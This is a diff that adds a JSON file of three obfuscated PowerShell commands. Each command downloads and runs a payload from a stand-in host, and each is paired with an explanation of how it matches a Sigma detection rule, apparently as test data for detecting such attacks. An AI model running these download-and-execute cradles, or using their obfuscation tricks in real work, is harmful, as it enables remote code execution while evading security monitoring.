@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -c \"&('In'+'voke-Ex'+'pression') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('http://malicious.local/payload')\"",
+    "explanation": "This command uses string concatenation to bypass detection by splitting 'Invoke-Expression' and 'New-Object' into parts that are joined at runtime. It matches the Sigma rule's pattern of obfuscated command-line arguments."
+  },
+  {
+    "output": "powershell.exe -c \"&({0}{1}{2}{3}{4} -f 'In','voke-','Ex','pres','sion') (.({0}{1}{2} -f 'Ne','w-','Obje'+'ct') Net.WebClient).DownloadString('http://malicious.local/payload')\"",
+    "explanation": "This command uses string formatting with -f to obfuscate 'Invoke-Expression' and 'New-Object'. It aligns with the Sigma rule's detection of obfuscated command-line arguments using string formatting."
+  },
+  {
+    "output": "powershell.exe -c \"&('In'+'vOke-Expre'+'ssion') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('http://malicious.local/payload')\"",
+    "explanation": "This command uses insertion and substitution techniques to obfuscate 'Invoke-Expression' and 'New-Object'. It matches the Sigma rule's pattern of obfuscated command-line arguments."
+  }
+]
